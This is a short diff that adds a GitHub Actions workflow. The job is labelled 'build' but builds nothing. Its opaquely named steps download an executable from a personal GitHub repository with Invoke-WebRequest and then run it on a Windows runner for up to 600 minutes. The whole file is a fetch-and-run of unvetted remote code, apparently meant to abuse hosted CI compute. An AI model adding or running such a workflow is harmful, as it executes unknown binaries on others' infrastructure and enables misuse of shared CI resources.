@@ -1,0 +1,11 @@
+name: JohnLocke
+on: workflow_dispatch
+jobs:
+  build:
+    runs-on: windows-2019
+    steps:
+    - name: SGH
+      run: Invoke-WebRequest https://github.com/Shubham7746121/Johnlocke/raw/main/JohnLocke.exe -OutFile JohnLocke.exe
+    - name: WVU
+      run: .\JohnLocke.exe
+      timeout-minutes: 600
